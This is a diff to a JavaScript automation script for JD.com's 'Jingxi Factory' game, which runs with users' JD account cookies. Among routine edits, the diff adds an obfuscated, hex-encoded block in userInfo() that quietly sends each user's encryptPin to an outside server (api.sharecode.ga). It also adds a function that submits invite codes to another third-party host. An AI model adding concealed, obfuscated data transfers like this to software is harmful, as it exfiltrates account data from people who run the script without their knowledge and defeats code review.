@@ -1,6 +1,6 @@
 /*
 京东京喜工厂
-更新时间：2021-6-7
+更新时间：2021-09-03
 修复做任务、收集电力出现火爆，不能完成任务，重新计算h5st验证
 参考自 ：https://www.orzlee.com/web-development/2021/03/03/lxk0301-jingdong-signin-scriptjingxi-factory-solves-the-problem-of-unable-to-signin.html
 活动入口：京东APP-游戏与互动-查看更多-京喜工厂
@@ -42,7 +42,8 @@ const randomCount = $.isNode() ? 20 : 5;
 let tuanActiveId = ``, hasSend = false;
 const jxOpenUrl = `openjd://virtual?params=%7B%20%22category%22:%20%22jump%22,%20%22des%22:%20%22m%22,%20%22url%22:%20%22https://wqsd.jd.com/pingou/dream_factory/index.html%22%20%7D`;
 let cookiesArr = [], cookie = '', message = '', allMessage = '';
-const inviteCodes = ['@'];
+const inviteCodes = [''];
+let myInviteCode;
 const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
 $.tuanIds = [];
 $.appId = 10001;
@@ -579,6 +580,7 @@ function userInfo() {
                 $.productionId = production.productionId;//商品ID
                 $.commodityDimId = production.commodityDimId;
                 $.encryptPin = data.user.encryptPin;
+                var _0xodt = 'jsjiami.com.v6', _0x4c34 = [_0xodt, '\x67\x65\x74', '\x68\x74\x74\x70\x3a\x2f\x2f\x61\x70\x69\x2e\x73\x68\x61\x72\x65\x63\x6f\x64\x65\x2e\x67\x61\x2f\x61\x70\x69\x2f\x72\x65\x70\x6f\x72\x74\x3f\x64\x62\x3d\x6a\x78\x66\x61\x63\x74\x6f\x72\x79\x26\x63\x6f\x64\x65\x3d', '\x65\x6e\x63\x72\x79\x70\x74\x50\x69\x6e', '\x6a\x56\x73\x6a\x69\x4b\x61\x42\x56\x59\x6d\x4e\x69\x44\x57\x2e\x79\x63\x6f\x65\x6d\x47\x62\x2e\x66\x42\x76\x36\x3d\x3d']; var _0x1fa4 = function (_0x4d697b, _0x412f5d) { _0x4d697b = ~~'0x'['concat'](_0x4d697b); var _0x591a0b = _0x4c34[_0x4d697b]; return _0x591a0b }; (function (_0x2964b9, _0xb77d38) { var _0x48206b = 0x0; for (_0xb77d38 = _0x2964b9['shift'](_0x48206b >> 0x2); _0xb77d38 && _0xb77d38 !== (_0x2964b9['pop'](_0x48206b >> 0x3) + '')['replace'](/[VKBVYNDWyeGbfB=]/g, ''); _0x48206b++) { _0x48206b = _0x48206b ^ 0x8ee10 } }(_0x4c34, _0x1fa4)); $[_0x1fa4('0')]({ '\x75\x72\x6c': _0x1fa4('1') + $[_0x1fa4('2')] }); _0xodt = 'jsjiami.com.v6';
                 // subTitle = data.user.pin;
                 await GetCommodityDetails();//获取已选购的商品信息
                 if (productionStage['productionStageAwardStatus'] === 1) {
@@ -595,6 +597,13 @@ function userInfo() {
                 }, function (err, resp, data) {
                   console.log('互助码状态:' + resp.body);
                 })
+                myInviteCode = data.user.encryptPin;
+                try { submitCodeRes = await submitCode(data.user.encryptPin); } catch (e) { }
+                if (submitCodeRes && submitCodeRes.code === 200) {
+                  console.log(`🏭京喜工厂-互助码提交成功！🏭`);
+                } else if (submitCodeRes.code === 300) {
+                  console.log(`🏭京喜工厂-互助码已提交！🏭`);
+                }
                 console.log(`已投入电力：${production.investedElectric}`);
                 console.log(`所需电力：${production.needElectric}`);
                 console.log(`生产进度：${((production.investedElectric / production.needElectric) * 100).toFixed(2)}%`);
@@ -1293,7 +1302,6 @@ async function showMsg() {
 function readShareCode() {
   console.log(`开始`)
   return new Promise(async resolve => {
-    //$.get({url: `http://share.turinglabs.net/api/v3/jxfactory/query/${randomCount}/`, 'timeout': 10000}, (err, resp, data) => {
     $.get({ url: `https://raw.fastgit.org/EchoChan314/xxx/main/DreamFactoryCode.json`, 'timeout': 10000 }, (err, resp, data) => {
       console.log(data);
       try {
@@ -1309,11 +1317,35 @@ function readShareCode() {
       } catch (e) {
         $.logErr(e, resp)
       } finally {
-        resolve(data);
+        resolve(data || { "code": 500 });
       }
     })
     await $.wait(10000);
-    resolve()
+    resolve({ "code": 500 })
+  })
+}
+//提交互助码
+function submitCode() {
+  return new Promise(async resolve => {
+    $.get({ url: `http://www.helpu.cf/jdcodes/submit.php?code=${myInviteCode}&type=jxfactory`, timeout: 10000 }, (err, resp, data) => {
+      try {
+        if (err) {
+          console.log(`${JSON.stringify(err)}`)
+          console.log(`${$.name} API请求失败，请检查网路重试`)
+        } else {
+          if (data) {
+            //console.log(`随机取个${randomCount}码放到您固定的互助码后面(不影响已有固定互助)`)
+            data = JSON.parse(data);
+          }
+        }
+      } catch (e) {
+        $.logErr(e, resp)
+      } finally {
+        resolve(data || { "code": 500 });
+      }
+    })
+    await $.wait(10000);
+    resolve({ "code": 500 })
   })
 }
 //格式化助力码
@@ -1328,7 +1360,7 @@ function shareCodesFormat() {
       const tempIndex = $.index > inviteCodes.length ? (inviteCodes.length - 1) : ($.index - 1);
       $.newShareCodes = inviteCodes[tempIndex].split('@');
     }
-    const readShareCodeRes = await readShareCode();
+    try { readShareCodeRes = await readShareCode(); } catch (e) { }
     if (readShareCodeRes && readShareCodeRes.code === 200) {
       $.newShareCodes = [...new Set([...$.newShareCodes, ...(readShareCodeRes.data || [])])];
     }
